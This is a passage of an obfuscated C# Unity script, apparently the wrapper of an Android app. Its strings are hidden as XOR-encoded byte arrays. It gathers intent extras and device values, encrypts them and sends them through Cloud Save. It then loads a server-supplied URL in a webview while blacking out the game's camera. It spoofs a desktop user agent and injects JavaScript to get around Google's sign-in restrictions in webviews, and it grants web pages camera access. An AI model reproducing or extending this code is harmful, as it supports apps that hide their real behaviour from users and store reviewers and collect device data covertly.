            if (_0xcc82a138 != null && _0xcc82a138.IsMainFrame && IsGoogleAuthFlowUrl(_0x48ca3eb0) && !_0x9c72ce68)
            {
                WLog(_0x019ade1a._0xa5740c93(new byte[62] { 32, 12, 4, 3, 77, 58, 8, 15, 59, 4, 8, 26, 77, 9, 8, 25, 8, 14, 25, 8, 9, 77, 42, 2, 2, 10, 1, 8, 77, 12, 24, 25, 5, 77, 56, 63, 33, 77, 64, 83, 77, 31, 8, 1, 2, 12, 9, 77, 26, 4, 25, 5, 77, 42, 2, 2, 10, 1, 8, 77, 56, 44 }, 109));
                _0x9c72ce68 = true;
                _0xbe659bab(true);
                _0x21de6645.SetUserAgent(_0xada17828());
                _0x21de6645.Load(_0x48ca3eb0);
                return false;
            }

            return true;
        });
        _0x040322c5.OnLoadingErrorReceived += (_0x1fd58328, _0x029eadb9, _0x2ce333f0, _0x0817d876) =>
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[25] { 46, 2, 10, 13, 67, 52, 6, 1, 53, 10, 6, 20, 67, 38, 17, 17, 12, 17, 89, 67, 0, 12, 7, 6, 94 }, 99) + _0x029eadb9 + _0x019ade1a._0xa5740c93(new byte[9] { 9, 68, 76, 90, 90, 72, 78, 76, 20 }, 41) + _0x2ce333f0);
            string _0xda1f445a = GetFailingUrl(_0x0817d876);
            if (string.IsNullOrEmpty(_0xda1f445a) || IsAboutBlank(_0xda1f445a))
                return;
            _ = _0x9ef6f88b(_0x019ade1a._0xa5740c93(new byte[8] { 40, 41, 0, 58, 45, 45, 48, 45 }, 95));
            WLog(_0x019ade1a._0xa5740c93(new byte[45] { 221, 241, 249, 254, 176, 199, 245, 242, 198, 249, 245, 231, 176, 246, 241, 249, 252, 249, 254, 247, 176, 197, 194, 220, 176, 189, 174, 176, 255, 224, 245, 254, 176, 245, 232, 228, 245, 226, 254, 241, 252, 252, 233, 170, 176 }, 144) + _0xda1f445a);
            StopCurrentFailedLoad(_0x1fd58328);
            _0xe47c1bdd(_0xda1f445a);
        };
        _0x040322c5.OnPageStarted += (_0x1fd58328, _0x5faa02ff) =>
        {
            _0xfda88229 = 0;
            if (_0x99644d4e && IsAboutBlank(_0x5faa02ff))
            {
                WLog(_0x019ade1a._0xa5740c93(new byte[27] { 195, 225, 246, 228, 242, 225, 254, 179, 242, 241, 252, 230, 231, 169, 241, 255, 242, 253, 248, 179, 224, 231, 242, 225, 231, 246, 247 }, 147));
                return;
            }

            WLog(_0x019ade1a._0xa5740c93(new byte[29] { 124, 80, 88, 95, 17, 102, 84, 83, 103, 88, 84, 70, 17, 126, 95, 97, 80, 86, 84, 98, 69, 80, 67, 69, 84, 85, 11, 17, 26 }, 49) + (Time.realtimeSinceStartup - _0x2aab99d4).ToString(_0x019ade1a._0xa5740c93(new byte[5] { 192, 222, 192, 192, 192 }, 240)) + _0x019ade1a._0xa5740c93(new byte[2] { 222, 141 }, 173) + _0x5faa02ff);
            if (TryOpenExternalLikeChrome(_0x5faa02ff))
            {
                StopCurrentFailedLoad(_0x1fd58328);
                return;
            }

            if (ContainsIgnoreCase(_0x5faa02ff, _0x019ade1a._0xa5740c93(new byte[8] { 135, 138, 138, 130, 205, 130, 147, 147 }, 227)) || ContainsIgnoreCase(_0x5faa02ff, _0x019ade1a._0xa5740c93(new byte[15] { 45, 60, 36, 115, 42, 52, 57, 58, 56, 41, 115, 63, 49, 50, 58 }, 93)) || _0x5faa02ff.StartsWith(_0x019ade1a._0xa5740c93(new byte[25] { 0, 28, 28, 24, 27, 82, 71, 71, 10, 24, 15, 4, 7, 10, 9, 4, 14, 9, 30, 70, 4, 1, 30, 13, 71 }, 104), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x1fd58328);
                OpenUrlExternally(_0x5faa02ff);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x5faa02ff))
            {
                _0xbe659bab(true);
                WLog(_0x019ade1a._0xa5740c93(new byte[41] { 181, 157, 157, 149, 158, 151, 210, 147, 135, 134, 154, 210, 148, 158, 157, 133, 210, 150, 151, 134, 151, 145, 134, 151, 150, 210, 223, 204, 210, 153, 151, 151, 130, 210, 132, 155, 129, 155, 144, 158, 151 }, 242));
                return;
            }

            _0x63c26322 = true;
            _0xbe659bab(true);
            WLog(_0x019ade1a._0xa5740c93(new byte[43] { 202, 248, 255, 203, 244, 248, 234, 189, 241, 242, 252, 249, 244, 243, 250, 178, 239, 248, 249, 244, 239, 248, 254, 233, 244, 243, 250, 189, 176, 163, 189, 246, 248, 248, 237, 189, 235, 244, 238, 244, 255, 241, 248 }, 157));
        };
        _0x040322c5.OnPageCommitted += (_0x1fd58328, _0x5faa02ff) =>
        {
            if (_0x99644d4e && IsAboutBlank(_0x5faa02ff))
                return;
            WLog(_0x019ade1a._0xa5740c93(new byte[31] { 179, 159, 151, 144, 222, 169, 155, 156, 168, 151, 155, 137, 222, 177, 144, 174, 159, 153, 155, 189, 145, 147, 147, 151, 138, 138, 155, 154, 196, 222, 213 }, 254) + (Time.realtimeSinceStartup - _0x2aab99d4).ToString(_0x019ade1a._0xa5740c93(new byte[5] { 177, 175, 177, 177, 177 }, 129)) + _0x019ade1a._0xa5740c93(new byte[2] { 215, 132 }, 164) + _0x5faa02ff);
            if (!firstLoadShown && IsHttpUrl(_0x5faa02ff))
            {
                firstLoadShown = true;
                _0x63c26322 = false;
                _0xbe659bab(false);
                _0xc0dd8ea9();
                _0x7acbae58();
                _0x1fd58328.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x9ef6f88b(_0x019ade1a._0xa5740c93(new byte[9] { 106, 107, 66, 114, 109, 120, 115, 120, 121 }, 29));
                WLog(_0x019ade1a._0xa5740c93(new byte[39] { 250, 214, 222, 217, 151, 224, 210, 213, 225, 222, 210, 192, 151, 196, 223, 216, 192, 217, 151, 216, 217, 151, 212, 216, 218, 218, 222, 195, 195, 210, 211, 151, 212, 216, 217, 195, 210, 217, 195 }, 183));
            }
        };
        _0x040322c5.OnPageProgressChanged += (_0x1fd58328, _0xa6ca3cf7) =>
        {
            if (_0x99644d4e)
                return;
            if (!firstLoadShown && _0xa6ca3cf7 >= 0.65f)
            {
                firstLoadShown = true;
                _0x63c26322 = false;
                _0xbe659bab(false);
                _0xc0dd8ea9();
                _0x7acbae58();
                _0x1fd58328.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x9ef6f88b(_0x019ade1a._0xa5740c93(new byte[9] { 69, 68, 109, 93, 66, 87, 92, 87, 86 }, 50));
                WLog(_0x019ade1a._0xa5740c93(new byte[32] { 163, 143, 135, 128, 206, 185, 139, 140, 184, 135, 139, 153, 206, 157, 134, 129, 153, 128, 206, 140, 151, 206, 158, 156, 129, 137, 156, 139, 157, 157, 212, 206 }, 238) + _0xa6ca3cf7);
            }
        };
        _0x040322c5.OnPageFinished += (_0x1fd58328, _0x029eadb9, _0x5faa02ff) =>
        {
            if (_0x99644d4e && IsAboutBlank(_0x5faa02ff))
            {
                _0x99644d4e = false;
                WLog(_0x019ade1a._0xa5740c93(new byte[28] { 255, 221, 202, 216, 206, 221, 194, 143, 206, 205, 192, 218, 219, 149, 205, 195, 206, 193, 196, 143, 201, 198, 193, 198, 220, 199, 202, 203 }, 175));
                return;
            }

            WLog(_0x019ade1a._0xa5740c93(new byte[24] { 54, 26, 18, 21, 91, 44, 30, 25, 45, 18, 30, 12, 91, 61, 18, 21, 18, 8, 19, 30, 31, 65, 91, 80 }, 123) + (Time.realtimeSinceStartup - _0x2aab99d4).ToString(_0x019ade1a._0xa5740c93(new byte[5] { 103, 121, 103, 103, 103 }, 87)) + _0x019ade1a._0xa5740c93(new byte[7] { 75, 24, 91, 87, 92, 93, 5 }, 56) + _0x029eadb9 + _0x019ade1a._0xa5740c93(new byte[5] { 242, 167, 160, 190, 239 }, 210) + _0x5faa02ff);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x63c26322 = false;
                _0xbe659bab(false);
                _0xc0dd8ea9();
                _0x7acbae58();
                _0x1fd58328.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x9ef6f88b(_0x019ade1a._0xa5740c93(new byte[9] { 109, 108, 69, 117, 106, 127, 116, 127, 126 }, 26));
                WLog(_0x019ade1a._0xa5740c93(new byte[33] { 17, 61, 53, 50, 124, 11, 57, 62, 10, 53, 57, 43, 124, 58, 53, 46, 47, 40, 124, 48, 51, 61, 56, 124, 63, 51, 49, 44, 48, 57, 40, 57, 56 }, 92));
            }
            else if (_0x63c26322)
            {
                _0x63c26322 = false;
                _0xbe659bab(false);
                _0x1fd58328.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x019ade1a._0xa5740c93(new byte[40] { 16, 60, 52, 51, 125, 10, 56, 63, 11, 52, 56, 42, 125, 14, 53, 50, 42, 125, 60, 59, 41, 56, 47, 125, 49, 50, 60, 57, 52, 51, 58, 125, 59, 52, 51, 52, 46, 53, 56, 57 }, 93));
            }
            else
            {
                _0xbe659bab(false);
            }

            if (_0x9c72ce68 && !IsGoogleAuthFlowUrl(_0x5faa02ff) && !IsGoogleAuthFlowUrl(_0x5faa02ff))
            {
                WLog(_0x019ade1a._0xa5740c93(new byte[48] { 123, 83, 83, 91, 80, 89, 28, 93, 73, 72, 84, 28, 79, 89, 89, 81, 79, 28, 90, 85, 82, 85, 79, 84, 89, 88, 28, 17, 2, 28, 78, 89, 79, 72, 83, 78, 89, 28, 88, 89, 90, 93, 73, 80, 72, 28, 105, 125 }, 60));
                _0x9c72ce68 = false;
                _0x21de6645.SetUserAgent("");
            }
        };
        _0x040322c5.OnShouldClose += _0x1fd58328 =>
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[41] { 58, 53, 4, 18, 21, 60, 65, 44, 0, 8, 15, 65, 54, 4, 3, 55, 8, 4, 22, 65, 46, 15, 50, 9, 14, 20, 13, 5, 34, 13, 14, 18, 4, 65, 8, 15, 23, 14, 10, 4, 5 }, 97));
            _0xf5c5d743();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x040322c5.SetPopupPageEventEnabled(true);
        bool _0xb8cba536 = false;
        bool _0xb0626566 = false;
        _0x040322c5.OnMultipleWindowOpened += (_0x1fd58328, _0x7815eb37) =>
        {
            _0x1fd58328.ScrollTo(0, 0, false);
            WLog(_0x019ade1a._0xa5740c93(new byte[43] { 244, 251, 202, 220, 219, 242, 143, 226, 206, 198, 193, 143, 248, 202, 205, 249, 198, 202, 216, 143, 226, 218, 195, 219, 198, 223, 195, 202, 248, 198, 193, 203, 192, 216, 143, 224, 223, 202, 193, 202, 203, 149, 143 }, 175) + _0x7815eb37);
            var _0x3b7256cc = _0x040322c5.GetPopupWindow(_0x7815eb37);
            if (_0x3b7256cc == null)
                return;
            _0xbcf7cc63.Add(_0x3b7256cc);
            Debug.Log($"[Test] Popup ID: {_0x3b7256cc.Id}");
            _0x3b7256cc.OnPageStarted += (_0x53d513aa, _0x5faa02ff) =>
            {
                WLog(_0x019ade1a._0xa5740c93(new byte[36] { 30, 17, 32, 54, 49, 24, 101, 21, 42, 53, 48, 53, 101, 18, 32, 39, 19, 44, 32, 50, 101, 10, 43, 21, 36, 34, 32, 22, 49, 36, 55, 49, 32, 33, 127, 101 }, 69) + _0x5faa02ff);
                _0xfda88229 = 0;
                if (string.IsNullOrEmpty(_0x5faa02ff) || IsAboutBlank(_0x5faa02ff))
                    return;
                if (IsGoogleAuthFlowUrl(_0x5faa02ff))
                {
                    WLog(_0x019ade1a._0xa5740c93(new byte[57] { 8, 7, 54, 32, 39, 14, 115, 3, 60, 35, 38, 35, 115, 20, 60, 60, 52, 63, 54, 115, 50, 38, 39, 59, 115, 53, 63, 60, 36, 115, 126, 109, 115, 32, 35, 60, 60, 53, 115, 20, 60, 60, 52, 63, 54, 115, 16, 59, 33, 60, 62, 54, 115, 6, 18, 105, 115 }, 83) + _0x5faa02ff);
                    _0xb8cba536 = false;
                    _0xc0cc2ebe();
                    if (_0x53d513aa != null && _0x53d513aa.IsAlive)
                        _0x53d513aa.EvaluateJavaScript(_0xf03b56a3());
                    return;
                }

                if (_0x21de6645 == null)
                    return;
                if (!_0xb8cba536)
                {
                    _0xb8cba536 = true;
                    _0x21de6645.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x019ade1a._0xa5740c93(new byte[39] { 80, 95, 110, 120, 127, 86, 43, 91, 100, 123, 126, 123, 43, 106, 123, 123, 103, 114, 43, 92, 98, 101, 111, 100, 124, 120, 43, 111, 110, 120, 96, 127, 100, 123, 43, 94, 74, 49, 43 }, 11) + _0x5faa02ff);
                }

                if (_0x53d513aa != null && _0x53d513aa.IsAlive)
                    _0x53d513aa.EvaluateJavaScript(_0x92d13daa());
                if (!_0xb0626566 && _0x53d513aa != null && _0x53d513aa.IsAlive && IsHttpUrl(_0x5faa02ff))
                {
                    _0xb0626566 = true;
                }
            };
            _0x3b7256cc.OnPageFinished += (_0x53d513aa, _0x0817d876) =>
            {
                string _0x5d9a562d = _0x0817d876 != null ? _0x0817d876.data : string.Empty;
                WLog(_0x019ade1a._0xa5740c93(new byte[35] { 110, 97, 80, 70, 65, 104, 21, 101, 90, 69, 64, 69, 21, 98, 80, 87, 99, 92, 80, 66, 21, 115, 92, 91, 92, 70, 93, 80, 81, 15, 21, 64, 71, 89, 8 }, 53) + _0x5d9a562d);
                if (_0x53d513aa == null || !_0x53d513aa.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x5d9a562d))
                {
                    _0xc0cc2ebe();
                    _0x53d513aa.EvaluateJavaScript(_0xf03b56a3());
                    return;
                }

                if (!_0xb8cba536)
                    return;
                _0x53d513aa.EvaluateJavaScript(_0x92d13daa());
            };
        };
        _0x040322c5.OnMultipleWindowClosed += (_0x1fd58328, _0x7815eb37) =>
        {
            _0xbcf7cc63.RemoveAll(_0xed40639c => _0xed40639c == null || _0xed40639c.Id == _0x7815eb37 || !_0xed40639c.IsAlive);
            _0xbe659bab(false);
            if (_0xbcf7cc63.Count == 0 && _0x21de6645 != null)
            {
                _0xb8cba536 = false;
                _0xb0626566 = false;
                _0xd24295c6();
            }

            WLog(_0x019ade1a._0xa5740c93(new byte[43] { 204, 195, 242, 228, 227, 202, 183, 218, 246, 254, 249, 183, 192, 242, 245, 193, 254, 242, 224, 183, 218, 226, 251, 227, 254, 231, 251, 242, 192, 254, 249, 243, 248, 224, 183, 212, 251, 248, 228, 242, 243, 173, 183 }, 151) + _0x7815eb37);
        };
        _0x040322c5.RegisterOnRequestMediaCapturePermission(_0xcc82a138 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private void _0x10a66ddf(string _0x88452dcd)
    {
        bool _0xa3dc3d50 = !string.IsNullOrEmpty(_0x88452dcd);
        if (_0xa3dc3d50)
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[13] { 182, 185, 136, 158, 153, 176, 205, 190, 133, 130, 154, 215, 205 }, 237) + _0x88452dcd);
#endif
            }

            _0x19493c9c(_0x88452dcd);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[39] { 210, 221, 236, 250, 253, 212, 169, 207, 232, 229, 229, 235, 232, 234, 226, 169, 107, 15, 27, 169, 206, 232, 228, 236, 169, 161, 231, 230, 169, 239, 224, 231, 232, 229, 169, 220, 219, 197, 160 }, 137));
#endif
            }

            _0xaea71745();
            return;
        }
    }

    // WEB VIEW LOGIC END
    internal void _0x639f102e()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0xb93566f5 = new AndroidNotificationChannel
        {
            Id = _0x019ade1a._0xa5740c93(new byte[15] { 105, 104, 107, 108, 120, 97, 121, 82, 110, 101, 108, 99, 99, 104, 97 }, 13),
            Name = _0x019ade1a._0xa5740c93(new byte[15] { 50, 19, 16, 23, 3, 26, 2, 86, 53, 30, 23, 24, 24, 19, 26 }, 118),
            Importance = Importance.High,
            Description = _0x019ade1a._0xa5740c93(new byte[21] { 191, 157, 150, 157, 138, 153, 148, 216, 150, 151, 140, 145, 158, 145, 155, 153, 140, 145, 151, 150, 139 }, 248)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0xb93566f5);
        // Build notification
        var _0x5c08d34d = new AndroidNotification
        {
            Title = _0xd317ad5d[UnityEngine.Random.Range(0, _0xd317ad5d.Length)],
            Text = _0x019ade1a._0xa5740c93(new byte[21] { 226, 209, 198, 131, 218, 204, 214, 131, 208, 214, 209, 198, 131, 215, 204, 131, 198, 219, 202, 215, 156 }, 163),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x5c08d34d, _0x019ade1a._0xa5740c93(new byte[15] { 45, 44, 47, 40, 60, 37, 61, 22, 42, 33, 40, 39, 39, 44, 37 }, 73));
    }

    private string _0x54e52440 { get; set; }

    private string _0xe52280c2 = "";
    private float _0x2aab99d4 = 0f;
    private bool _0x7b6b65fe()
    {
        _0xbcf7cc63.RemoveAll(_0xed40639c => _0xed40639c == null || !_0xed40639c.IsAlive);
        return _0xbcf7cc63.Count > 0;
    }

    private JObject _0x6b4fef6b(params string[] _0x40da9b82)
    {
        JObject _0xe51238c8 = new JObject();
        foreach (var _0xad44ebaa in _0x40da9b82)
        {
            string _0x2f334ada = _0x187dfb56();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x2f334ada} val={_0xad44ebaa}");
#endif
            }

            _0xe51238c8.Add(_0x2f334ada, _0xad44ebaa == null ? "" : _0xad44ebaa);
        }

        return _0xe51238c8;
    }

    private string _0xe0634159 = "";
    private bool _0xf66b958e = false;
    private bool _0x1b54adb2()
    {
        if (_0x297dce60())
            return true;
        if (_0x21de6645 != null && _0x21de6645.CanGoBack)
        {
            WLog(_0x019ade1a._0xa5740c93(new byte[36] { 55, 30, 13, 27, 8, 30, 13, 26, 95, 29, 30, 28, 20, 95, 82, 65, 95, 18, 30, 22, 17, 95, 40, 26, 29, 41, 22, 26, 8, 95, 56, 16, 61, 30, 28, 20 }, 127));
            _0x21de6645.GoBack();
            return true;
        }

        return false;
    }

    private async Task<string> _0x6ff14ded(int _0x5bb75080 = 5, int _0xe0d98d8d = 500)
    {
        try
        {
            List<EntityData> _0xd339d298 = new List<EntityData>();
            int _0x38dd4a3e = 0;
            do
            {
                _0xd339d298 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x019ade1a._0xa5740c93(new byte[8] { 201, 213, 216, 192, 220, 203, 240, 221 }, 185), _0xc9862e79, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0xc9862e79 }), new QueryOptions())).ToList();
                await Task.Delay(_0xe0d98d8d);
            }
            while (_0xd339d298.Count == 0 && _0x38dd4a3e++ < _0x5bb75080);
            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[33] { 139, 132, 181, 163, 164, 141, 240, 131, 177, 166, 181, 180, 240, 156, 185, 190, 187, 240, 129, 165, 181, 162, 169, 240, 162, 181, 163, 165, 188, 164, 163, 234, 240 }, 208) + JsonConvert.SerializeObject(_0xd339d298, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[39] { 2, 13, 60, 42, 45, 4, 121, 10, 56, 47, 60, 61, 121, 21, 48, 55, 50, 121, 8, 44, 60, 43, 32, 121, 43, 60, 42, 44, 53, 45, 42, 121, 58, 54, 44, 55, 45, 99, 121 }, 89) + _0xd339d298.Count);
                }
#endif
            }

            var _0x3e56ee44 = _0xd339d298.SelectMany(_0xd44a3461 => _0xd44a3461.Data).FirstOrDefault(_0x0bca5eae => _0x0bca5eae.Key == _0xc9862e79)?.Value.GetAs<string>() ?? string.Empty;
            _0x3e56ee44 = Decrypt(_0x3e56ee44, _0xc9862e79);
            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[24] { 96, 111, 94, 72, 79, 102, 27, 119, 84, 90, 95, 27, 72, 90, 77, 94, 95, 27, 87, 82, 85, 80, 1, 27 }, 59) + _0x3e56ee44);
                }
#endif
            }

            return _0x3e56ee44;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x019ade1a._0xa5740c93(new byte[39] { 10, 5, 52, 34, 37, 12, 113, 22, 52, 37, 113, 62, 35, 113, 33, 48, 35, 34, 52, 113, 34, 48, 39, 52, 53, 113, 61, 56, 63, 58, 113, 55, 48, 56, 61, 52, 53, 107, 113 }, 81) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    internal bool IsGoogleAuthFlowUrl(string _0x0b357592)
    {
        if (string.IsNullOrEmpty(_0x0b357592))
            return false;
        return _0x0b357592.IndexOf(_0x019ade1a._0xa5740c93(new byte[19] { 202, 200, 200, 196, 222, 197, 223, 216, 133, 204, 196, 196, 204, 199, 206, 133, 200, 196, 198 }, 171), StringComparison.OrdinalIgnoreCase) >= 0 || _0x0b357592.IndexOf(_0x019ade1a._0xa5740c93(new byte[16] { 205, 207, 207, 195, 217, 194, 216, 223, 130, 203, 195, 195, 203, 192, 201, 130 }, 172), StringComparison.OrdinalIgnoreCase) >= 0 || _0x0b357592.IndexOf(_0x019ade1a._0xa5740c93(new byte[21] { 54, 62, 62, 54, 61, 52, 36, 34, 52, 35, 50, 62, 63, 37, 52, 63, 37, 127, 50, 62, 60 }, 81), StringComparison.OrdinalIgnoreCase) >= 0 || _0x0b357592.IndexOf(_0x019ade1a._0xa5740c93(new byte[11] { 163, 183, 176, 165, 176, 173, 167, 234, 167, 171, 169 }, 196), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private void _0xc0dd8ea9()
    {
        if (Camera.main == null)
            return;
        Camera.main.cullingMask = 0;
        Camera.main.clearFlags = CameraClearFlags.SolidColor;
        Camera.main.backgroundColor = Color.black;
    }

    private async void Start()
    {
        await _0xf67e5d0a();
    }

    private string _0x8faf629c;
    private string _0x187dfb56()
    {
        string _0x6c616973 = _0x019ade1a._0xa5740c93(new byte[62] { 156, 159, 158, 153, 152, 155, 154, 149, 148, 151, 150, 145, 144, 147, 146, 141, 140, 143, 142, 137, 136, 139, 138, 133, 132, 135, 188, 191, 190, 185, 184, 187, 186, 181, 180, 183, 182, 177, 176, 179, 178, 173, 172, 175, 174, 169, 168, 171, 170, 165, 164, 167, 205, 204, 207, 206, 201, 200, 203, 202, 197, 196 }, 253);
        System.Random _0xa8dd9d9a = new System.Random();
        int _0x8bacc913 = _0xa8dd9d9a.Next(8, 16);
        return new string (Enumerable.Repeat(_0x6c616973, _0x8bacc913).Select(_0x40d2c337 => _0x40d2c337[_0xa8dd9d9a.Next(_0x40d2c337.Length)]).ToArray());
    }

    private void _0xf0a9c5ca()
    {
        using (var _0xd092c93d = new AndroidJavaClass(_0x019ade1a._0xa5740c93(new byte[30] { 222, 210, 208, 147, 200, 211, 212, 201, 196, 142, 217, 147, 205, 209, 220, 196, 216, 207, 147, 232, 211, 212, 201, 196, 237, 209, 220, 196, 216, 207 }, 189)))
        using (var _0xb615c869 = _0xd092c93d.GetStatic<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[15] { 132, 146, 149, 149, 130, 137, 147, 166, 132, 147, 142, 145, 142, 147, 158 }, 231)))
        using (var _0x1f46359d = _0xb615c869.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[9] { 183, 181, 164, 153, 190, 164, 181, 190, 164 }, 208)))
        {
            if (_0x1f46359d == null)
                return;
            using (var _0x80cc2fcc = _0x1f46359d.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[9] { 64, 66, 83, 98, 95, 83, 85, 70, 84 }, 39)))
            {
                if (_0x80cc2fcc == null)
                    return;
                using (var _0x52613b30 = new AndroidJavaObject(_0x019ade1a._0xa5740c93(new byte[19] { 211, 206, 219, 146, 214, 207, 211, 210, 146, 246, 239, 243, 242, 243, 222, 214, 217, 223, 200 }, 188)))
                using (var _0xc2b96480 = _0x80cc2fcc.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[6] { 17, 31, 3, 41, 31, 14 }, 122)))
                using (var _0x3b17bf12 = _0xc2b96480.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[8] { 186, 167, 182, 161, 178, 167, 188, 161 }, 211)))
                {
                    while (_0x3b17bf12.Call<bool>(_0x019ade1a._0xa5740c93(new byte[7] { 252, 245, 231, 218, 241, 236, 224 }, 148)))
                    {
                        string _0x05456166 = _0x3b17bf12.Call<string>(_0x019ade1a._0xa5740c93(new byte[4] { 31, 20, 9, 5 }, 113));
                        using (var _0x3f93cf00 = _0x80cc2fcc.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[3] { 228, 230, 247 }, 131), _0x05456166))
                        {
                            _0x52613b30.Call<AndroidJavaObject>(_0x019ade1a._0xa5740c93(new byte[3] { 221, 216, 217 }, 173), _0x05456166, _0x3f93cf00);
                        }
                    }

                    string _0x5e4a492e = _0x52613b30.Call<string>(_0x019ade1a._0xa5740c93(new byte[8] { 80, 75, 119, 80, 86, 77, 74, 67 }, 36));
                    if (!string.IsNullOrEmpty(_0x5e4a492e))
                    {
                        _0xe0c3eca4(_0x5e4a492e);
                        _0xc9a995ef(_0x5e4a492e);
                    }
                }
            }
        }
    }

    private async Task _0x79c8ac62()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0xe0634159 = _0x019ade1a._0xa5740c93(new byte[5] { 198, 193, 204, 211, 197 }, 160);
        _0xb1b949a8 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x94c8e13f = DateTime.UtcNow.Ticks.ToString();
        _0x65514dcd = "";
        JObject _0xd9a1600f = _0x6b4fef6b(_0x9dd642dd, _0x6abf44b4, _0x02d91788, _0xd92a0b29, _0xc99f1e39, _0x54e52440, _0xa2f29b28, _0xb22f7ae7, _0x448dd134, _0x7331d679, _0xe0634159, _0x65514dcd, _0x145fb9a2, _0x37f917ba, _0x02babecd.ToString(), _0xa8cd78ab, _0x94c8e13f, _0xb1b949a8, _0xc9862e79, _0x423cd5cf, _0x14b759a0, _0xf158ca5f, _0x4de9e613());
        var _0xead99bb4 = _0x4002e2b0(_0xd9a1600f.ToString(), _0xc9862e79);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xd9a1600f}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x019ade1a._0xa5740c93(new byte[7] { 227, 242, 234, 255, 252, 242, 247 }, 147) + _0xc9862e79, _0xead99bb4 } });
            await Task.Delay(500);
            string _0xd6ae903e = "";
            for (int _0x51fe4d37 = 0; _0x51fe4d37 < 20; _0x51fe4d37++)
            {
                if (await _0xfb251b4c(1, 1))
                {
                    await _0x9ef6f88b(_0x019ade1a._0xa5740c93(new byte[7] { 168, 166, 165, 169, 161, 175, 174 }, 202));
                    _0xaea71745();
                    return;
                }

                _0xd6ae903e = await _0x6ff14ded(1, 500);
                if (!string.IsNullOrEmpty(_0xd6ae903e))
                    break;
            }

            _0x10a66ddf(_0xd6ae903e);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[22] { 179, 188, 173, 187, 188, 181, 200, 175, 141, 134, 141, 154, 137, 132, 200, 141, 154, 154, 135, 154, 210, 200 }, 232) + e.Message);
#endif
            }

            _0xaea71745();
        }
    }

    private void _0xc9a995ef(string _0xbb5189cf)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x019ade1a._0xa5740c93(new byte[34] { 238, 225, 208, 198, 193, 232, 149, 243, 208, 193, 214, 221, 149, 240, 205, 193, 199, 212, 149, 229, 192, 198, 221, 149, 241, 212, 193, 212, 149, 231, 212, 194, 143, 149 }, 181) + _0xbb5189cf);
#endif
            }
        }

        var _0xc0adff3b = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xbb5189cf);
        StartCoroutine(_0x13e54d27(_0xc0adff3b));
    }

    private string Decrypt(string _0xad86c31b, string _0x44a72452)
    {
        try
        {
            var _0xe903365e = Convert.FromBase64String(_0xad86c31b);
            using var _0x387e3aec = Aes.Create();
            _0x387e3aec.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x44a72452));
            var _0xaef370ee = new byte[16];
            Buffer.BlockCopy(_0xe903365e, 0, _0xaef370ee, 0, 16);
            _0x387e3aec.IV = _0xaef370ee;
            using var _0x7b950a88 = new MemoryStream(_0xe903365e, 16, _0xe903365e.Length - 16);
            using var _0x9fb9c9dd = new CryptoStream(_0x7b950a88, _0x387e3aec.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0x34ed6e13 = new StreamReader(_0x9fb9c9dd, Encoding.UTF8);
            return _0x34ed6e13.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private void _0x8ec9417c()
    {
        if (_0x1b1b5926 != null)
            return;
        var _0x62cfebe0 = _0xda7ab8cb();
        _0x1b1b5926 = new GameObject(_0x019ade1a._0xa5740c93(new byte[14] { 196, 246, 241, 197, 250, 246, 228, 192, 227, 250, 253, 253, 246, 225 }, 147), typeof(RectTransform), typeof(Text));
        _0x84eb34f5 = _0x1b1b5926.GetComponent<RectTransform>();
        _0x84eb34f5.SetParent(_0x62cfebe0.transform, false);
        _0x84eb34f5.anchorMin = new Vector2(0.5f, 0.5f);
